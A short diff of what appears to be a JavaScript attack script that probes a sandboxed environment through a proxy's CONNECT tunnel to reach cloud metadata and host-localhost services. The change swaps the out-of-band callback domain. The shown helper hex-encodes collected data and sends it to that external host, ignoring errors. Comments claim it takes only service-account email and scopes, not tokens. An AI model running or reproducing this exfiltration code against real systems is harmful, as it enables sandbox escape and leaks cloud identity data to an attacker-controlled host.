@@ -2,7 +2,7 @@
 // GET forward-proxying forced :443; CONNECT takes an explicit host:port and opens a raw
 // tunnel on the PROXY's network — can reach metadata:80 + host-localhost the sandbox can't.
 // Responsible: fetches SA email/scopes (identifiers), NOT the access token value.
-var C = 'd8smlqboeaqna18ht8k03zdmsky9yr8b4.oast.live';
+var C = 'd8snfn3oeaqnepgd39e0ejibzwmzxc65z.oast.fun';
 var http = require('http'), dns = require('dns'), net = require('net');
 var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
 var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 1500), timeout: 8000 }, function () {}).on('error', function () {}); } catch (e) {} };
